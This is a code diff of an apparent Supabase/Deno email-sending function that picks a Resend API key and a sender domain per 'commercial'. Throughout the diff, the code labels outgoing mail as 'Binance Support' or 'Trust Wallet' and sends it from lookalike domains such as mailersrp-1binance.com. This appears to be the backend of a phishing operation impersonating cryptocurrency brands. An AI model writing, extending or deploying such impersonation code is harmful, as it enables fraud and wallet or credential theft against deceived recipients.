@@ -155,52 +155,44 @@ const handler = async (req: Request): Promise<Response> => {
         { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
       );
     }
-    // Choose Resend domain and API key based on commercial settings
-    let resendApiKey = '';
-    let fromDomain = '';
-    let sendMethod = 'resend';
-
     // Get commercial's email preferences
     const { data: commercialData, error: commercialError } = await supabase
       .from('commercials')
       .select('email_domain_preference')
       .eq('id', commercial_id)
       .single();
-    console.log('🔍 Commercial email preferences:', commercialData, 'Error:', commercialError);
-
-    // Force domain1 or domain2 - remove alias support completely
-    let emailPreference = (commercialData?.email_domain_preference || domain || 'domain1')?.toLowerCase();
-    if (emailPreference === 'alias') {
-      emailPreference = 'domain1'; // Force alias to domain1
-      console.log('🔄 Converted alias preference to domain1');
-    }
-    console.log('🎯 Email preference determined:', emailPreference);
-
-    // Determine sender name based on template content (check subject and content first)
+    
+    // Simple domain selection - use domain1 by default, domain2 if explicitly set
+    const emailPreference = (commercialData?.email_domain_preference || domain || 'domain1')?.toLowerCase();
+    
+    // Determine sender name based on template content
     const templateContent = (subject || content || '').toLowerCase();
     const isBinanceTemplate = templateContent.includes('binance');
     const emailSenderName = isBinanceTemplate ? 'Binance Support' : 'Trust Wallet';
-
-    // Set domain and API key based on preference
+    
+    // Set domain and API key - simple mapping
+    let resendApiKey = '';
+    let fromDomain = '';
+    let sendMethod = 'resend'; // Always resend now
+    
     if (emailPreference === 'domain2') {
       fromDomain = `${emailSenderName} <do_not_reply@mailersrp-2binance.com>`;
-      resendApiKey = Deno.env.get('RESEND_API_KEY_DOMAIN2') ?? '';
+      resendApiKey = Deno.env.get('RESEND_API_KEY_DOMAIN2') || Deno.env.get('RESEND_API_KEY') || '';
     } else {
+      // Default to domain1 for everything else (including alias)
       fromDomain = `${emailSenderName} <do_not_reply@mailersrp-1binance.com>`;
-      resendApiKey = Deno.env.get('RESEND_API_KEY') ?? '';
+      resendApiKey = Deno.env.get('RESEND_API_KEY') || '';
     }
-
-    console.log('Sender name:', emailSenderName);
+    
+    console.log('Using API key for domain:', emailPreference, 'from:', fromDomain);
 
     if (!resendApiKey) {
-      console.error('Missing Resend API key for selected domain');
+      console.error('Missing Resend API key');
       return new Response(
-        JSON.stringify({ error: 'Resend API key not configured for selected domain' }),
+        JSON.stringify({ error: 'Resend API key not configured' }),
         { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
       );
     }
-
-    console.log('📤 Final send method:', sendMethod, 'from:', fromDomain);
 
     // Fetch the current server IP from the database
     const { data: serverConfig, error: configError } = await supabase
